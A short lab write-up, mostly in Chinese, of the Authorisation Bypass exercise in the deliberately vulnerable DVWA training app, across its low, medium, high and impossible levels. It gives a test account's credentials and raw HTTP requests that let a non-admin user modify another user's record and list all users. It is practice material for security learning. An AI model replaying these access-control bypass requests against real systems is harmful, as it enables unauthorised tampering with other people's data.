 # DVWA- Authorisation Bypass
 
 
 
## low 

一般帳號
```
gordonb 
abc123
```

修改面板
```
http://dvwa.com/vulnerabilities/authbypass/
```

修改request 
```http=
POST /vulnerabilities/authbypass/change_user_details.php HTTP/1.1
Host: dvwa.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://dvwa.com/vulnerabilities/authbypass/
Content-Type: application/json
Content-Length: 48
Origin: http://dvwa.com
Connection: close
Cookie: PHPSESSID=sa8gcdf9sdi2fippu29vaav88s; security=low

{"id":5,"first_name":"Bob","surname":"Smith123"}
```






## medium 


顯示
```
http://dvwa.com/vulnerabilities/authbypass/


Unauthorised
```

中間多了驗證頁面
```
http://dvwa.com/vulnerabilities/authbypass/get_user_data.php
```

還是可以拿到所有資料
```
[{"user_id":"1","first_name":"admin","surname":"admin"},{"user_id":"2","first_name":"Gordon","surname":"Brown"},{"user_id":"3","first_name":"Hack","surname":"Me"},{"user_id":"4","first_name":"Pablo","surname":"Picasso"},{"user_id":"5","first_name":"Bob","surname":"Smith123"}]
```

修改
```http=
POST /vulnerabilities/authbypass/change_user_details.php HTTP/1.1
Host: dvwa.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://dvwa.com/vulnerabilities/authbypass/
Content-Type: application/json
Content-Length: 48
Origin: http://dvwa.com
Connection: close
Cookie: PHPSESSID=j5u9pbaotqf8jnkshapriu2ldr; security=medium

{"id":5,"first_name":"Bob","surname":"Smith456"}
```





## high

修改可以。
```
POST /vulnerabilities/authbypass/change_user_details.php HTTP/1.1
Host: dvwa.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://dvwa.com/vulnerabilities/authbypass/
Content-Type: application/json
Content-Length: 48
Origin: http://dvwa.com
Connection: close
Cookie: security=high

{"id":5,"first_name":"Bob","surname":"Smith456"}
```

查看不行
```
GET /vulnerabilities/authbypass/get_user_data.php HTTP/1.1
Host: dvwa.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://dvwa.com/vulnerabilities/authbypass/
Cookie:  security=high



//返回
{"result":"fail","error":"Access denied"}
```

或許可以注入查看，有空試試





## impossible


全部請求都加上驗證了無法。
